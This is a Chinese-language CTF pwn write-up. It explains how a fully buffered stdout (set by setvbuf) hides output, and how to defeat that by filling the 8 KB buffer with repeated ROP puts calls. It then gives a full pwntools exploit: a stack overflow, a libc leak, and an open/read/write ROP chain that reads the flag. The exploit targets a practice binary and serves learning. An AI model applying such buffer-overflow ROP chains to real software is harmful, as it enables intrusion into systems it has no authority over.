比赛好像难度挺合适的但没好好打。主要第一题打侧信道本地通了远程通不了破防了。快国赛了做点水题练手。

启动程序发现main里面的字符串没输出来。观察发现init()中setvbuf()对stdin和stdout的处理不一样。一个是setvbuf(stdin, 0LL, 2, 0LL)，一个是setvbuf(stdout, 0LL, 0, 0LL)。

>`int setvbuf(FILE *stream, char *buf, int mode, size_t size);`
>
>FILE *stream: 指向文件流的指针，通常由 fopen 或 fdopen 返回。
>
>char *buf: 指向用作缓冲区的字符数组。如果此参数为 NULL，则库将自行分配缓冲区。
>
>int mode: 缓冲模式，可以是以下值之一：
>
>_IOFBF(0)：完全缓冲（full buffering）。只有缓冲区满时，数据才会被写入或读取。
>
>_IOLBF(1)：行缓冲（line buffering）。在输出时，只有在遇到换行符或缓冲区满时才会刷新缓冲区；在输入时，只有在遇到换行符或缓冲区满时才会填充缓冲区。
>
>_IONBF(2)：无缓冲（no buffering）。数据不经过缓冲区，直接写入或读取。这是一般ctf题使用的模式。
>
>size_t size: 指定缓冲区的大小。仅当 mode 为 _IOFBF 或 _IOLBF 时有效。

可见这里将stdin设置为了无缓冲模式，故可以正常随意读入。将stdout设置为了完全缓冲模式，只有缓冲区满时，数据才会被写入到文件里。但这里又将size设置为了0，那么缓冲区大小是多少呢？

>如果 size 参数为 0，而 mode 为 _IOFBF，标准库通常会忽略用户指定的缓冲区大小，并使用实现定义的默认缓冲区大小。默认缓冲区大小通常是系统页面大小或标准库定义的某个合理值。
>
>GNU C Library (glibc)：
>
>对于完全缓冲的文件，默认缓冲区大小通常为 8192 字节（8 KB）。
>
>对于行缓冲的标准输入和标准输出，缓冲区大小通常与系统页面大小一致，通常是 4096 字节（4 KB）。
>
>Microsoft C Runtime Library：
>
>默认缓冲区大小通常为 4096 字节（4 KB）。

所以这道题中，每当stdout中的数据达到8K(0x2000)，这些数据就会一股脑输出来。于是有思路了，正常栈迁移输libc，然后反复栈溢出puts把缓冲区填满，即可拿到libc。
使用orw而非getshell，因为system("/bin/sh")之后交互中的输出似乎也是走的stdout，受上述完全缓冲限制python会直接读到EOF而停止交互。
w时将len设置为0x2000即可直接输出flag。

exp:
```python
from pwn import*
p = process("./pwn")
libc = ELF("./libc.so.6")
main = 0x40132b
vuln = 0x40125d
rdi = 0x4013d3
ret = 0x40101a
puts_plt = 0x4010b0
puts_got = 0x404018
str_2a = 0x402008
flag = 0x404090
p.send(b'a'*0x58 + p64(vuln))
rop = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
p.send(b'b'*0x28 + rop + b'a'*0x1b8)
rop = p64(rdi) + p64(str_2a) + p64(puts_plt) + p64(vuln)
# gdb.attach(p)
for i in range(0xc2):
    p.send(b'b'*0x28 + rop + b'a'*0x1b8)

p.recvline()
puts_got = u64(p.recv(6).ljust(8,b'\0'))
libc_base = puts_got - libc.symbols["puts"]
print(hex(libc_base))
system = libc_base + libc.symbols["system"]
str_bin_sh = libc_base + libc.search(b"/bin/sh").__next__()
rsi = libc_base + 0x2be51
rdx_r12 = libc_base + 0x11f2e7
open = libc_base + libc.symbols["open"]
read = libc_base + libc.symbols["read"]
write = libc_base + libc.symbols["write"]
rop = p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(6) + p64(0) + p64(read) + p64(vuln)
p.send(b'b'*0x28 + rop + b'a'*0x190)
p.send("./flag")
rop = p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0) + p64(0) + p64(open)
rop+= p64(rdi) + p64(3) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(0x40) + p64(0) + p64(read)
rop+= p64(rdi) + p64(1) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(0x2000) + p64(0) + p64(write)
gdb.attach(p)
p.send(b'b'*0x28 + rop)
p.interactive()
```
